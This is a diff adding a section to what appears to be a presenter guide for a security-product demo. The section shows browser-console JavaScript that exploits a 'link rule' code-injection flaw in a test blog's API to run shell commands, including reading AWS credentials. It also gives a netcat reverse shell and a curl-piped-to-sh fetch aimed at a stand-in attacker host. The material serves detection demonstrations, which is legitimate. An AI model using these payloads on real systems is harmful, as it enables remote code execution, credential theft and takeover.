@@ -18,6 +18,30 @@ product they already own does the rest.
 
 ---
 
+## Run it from the browser (no terminal)
+
+The attack can be fired straight from the blog itself. Open `https://blog-unhackable.apps-crc.testing/write`,
+press **F12 → Console**, and paste. The `/write` textarea only forwards real links (its JavaScript
+keeps `https?://…` and drops everything else), so the attacker goes around it and POSTs to the API —
+exactly what a real attacker does. Same code path as `demo.sh`, same RHACS detections.
+
+```js
+// Act 2 — remote code execution. Run any shell command through the "link rule" engine.
+const cmd = "id; uname -a; cat ~/.aws/credentials";
+const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
+fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
+  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));
+```
+
+Act 4 is the same snippet with one line changed (needs the C2 listener up — `scripts/attacker.sh c2`, or pane 2 in `make live`):
+
+```js
+const cmd = "nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'";  // reverse shell
+const cmd = "curl -s http://attacker.example.local:8080/stage.sh | sh";                                            // crypto miner
+```
+
+---
+
 ## How to speak to this room
 
 The people in the room are CISOs, directors and architects. They decide budgets and architecture.
